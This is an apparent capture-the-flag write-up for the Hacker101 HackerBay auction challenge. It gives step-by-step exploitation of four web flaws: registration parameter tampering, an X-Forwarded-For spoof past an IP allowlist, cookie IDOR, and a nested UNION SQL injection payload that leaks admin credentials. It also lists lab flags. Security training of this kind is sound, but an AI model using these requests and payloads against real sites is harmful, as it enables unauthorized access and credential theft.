# HackerBay (Hacker101)

Auction site: remove the **“HackerOne Username/Password List”** listing (auction **#8**, hash **`8ylbbgs2`** on typical instances). Expect **four** `^FLAG^…$FLAG$` rewards along the way for classic web issues (parameter pollution / trust boundaries, IP trust, IDOR, nested SQLi + admin workflow).

> Replace `BASE` with your instance (e.g. `https://<id>.ctf.hacker101.com`).  
> Example: `https://bddae40402773c77b30d51778f97c09e.ctf.hacker101.com/`

> **Note:** The challenge page is **HackerBay**, not RTFM. (An [RTFM.md](https://github.com/8r0wn13/hacker101_ctf/blob/main/RTFM.md) link is a different Hacker101 challenge.)

Background that matches this app’s design: [Bug Bounty Summit CTF write-up (krash.dev)](https://krash.dev/posts/bug-bounty-summit-ctf-writeup/) — same ideas (robots → secret path + `.htaccess`, `owner_hash` on register, subuser IDOR, `questions?id=` SQLi, admin delete).

---

## Recon

- **`robots.txt`** disallows **`/s3cr3t-4dm1n/`** (403 until you bypass IP rules).
- **`POST /reset`** with `username=hunter2` returns a hidden **`account_hash`** (parent user fingerprint) and a security question.
- Main register form normally sends `new_username` / `new_password`; subuser creation uses the same fields plus **`owner_hash`**. Supplying **`owner_hash`** on the **main** register form attaches the new account as a **pending subuser** under that parent.

---

## Flag 1 — `owner_hash` on public registration

`POST /register` with the victim parent’s hash (from reset):

```http
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

owner_hash=<account_hash_from_reset>&new_username=<you>&new_password=<6+_chars>
```

You land on **Awaiting Activation** with a flag in the page.

**Example (bddae404…):** `^FLAG^2f3bbc4e6a3bca35b68d044126df4495dc5cc03887886b294520a3348f826e38$FLAG$`

---

## Flag 2 — IP spoof for `/s3cr3t-4dm1n/`

Fuzz under `/s3cr3t-4dm1n/`; **`/.htaccess`** is often readable and shows **`Allow from 8.8.8.8`** / **`8.8.4.4`**. The app trusts **`X-Forwarded-For`** (or similar) enough to satisfy that check:

```bash
curl -sS -H 'X-Forwarded-For: 8.8.8.8' "$BASE/s3cr3t-4dm1n/"
```

The admin login page includes another flag.

**Example:** `^FLAG^0e4437e5917277dc7e9d374398b39831388db0020bee3ffcb40a11eb96b1338d$FLAG$`

---

## Flag 3 — IDOR: activate another user’s subuser

Goal: as a **normal** (parent) account, approve a subuser that belongs to **`hunter2`**.

1. Register a **subuser** under `hunter2` using **Flag 1** style (`owner_hash` + long password).
2. Log in as a **different** normal user; capture the **`token`** cookie from `POST /login`.
3. The app also sets **`userhash`**. On follow-up requests the server may **rotate** `userhash` back to *your* profile. For each request, force:

   `Cookie: token=<your_token>; userhash=<hunter2_account_hash_from_reset>`

4. `POST /dashboard/subusers` with `action=enable_subusers` (enable the subuser feature for the forged parent).
5. `POST /dashboard/subusers` with `hash=<subuser_profile_hash>&enable_toggle=enable` — the subuser’s **hash** is the **`userhash`** cookie you get when you log in as that subuser.

A successful activation response should include **`^FLAG^…$FLAG$`**. If you already finished the final delete step, repeat IDOR on a **fresh** instance if the UI state no longer shows pending subusers.

*(Technique detail: [krash.dev — Flag 3](https://krash.dev/posts/bug-bounty-summit-ctf-writeup/).)*

---

## Flag 4 — Nested SQLi + admin delete

Requires a session that can hit the dashboard JSON endpoint (e.g. **activated** subuser or normal user — subusers can call it even while “awaiting activation” in the UI).

**Endpoint:** `GET /dashboard/auctions/questions?id=…`

- Probe with boolean conditions on `id` to confirm injection.
- Use a **nested** `UNION`: outer query returns three JSON slots (`name`, `questions`, `auctions`); the first column is executed again as SQL. Leak **`admin`** credentials:

```text
id=0 union select '0 union select username,2,3,4,5,password,7,8,9 from admin',2,'[]'--
```

(URL-encode as needed; avoid breaking the inner query with raw quotes—hex-encode string literals inside the inner `SELECT` if necessary.)

**Example leak:** `username=h4ckerbayadmin`, `password=auction$rFun!`

Then:

1. `POST /s3cr3t-4dm1n/` with `X-Forwarded-For: 8.8.8.8` and those admin credentials.
2. Submit **`auction_hash=8ylbbgs2`** (from **Your Auctions** / listing metadata when logged in as the subuser).
3. `POST` again with **`action=delete`** and the same hash.

**Example:** `^FLAG^c33df939b8a031e7e1ef5e79288acb1baa35dfceff9cdf3971b15629824ead1e$FLAG$`

---

## Quick map

| Step | Issue |
|------|--------|
| 1 | Extra **`owner_hash`** on **`/register`** |
| 2 | **`X-Forwarded-For`** vs **`.htaccess`** IP allowlist |
| 3 | **`userhash`** trust / IDOR on **`/dashboard/subusers`** |
| 4 | Nested **`UNION`** on **`questions?id=`** → admin → delete listing |

---

## License

Challenge content is © HackerOne / Hacker101. These notes are for education only.
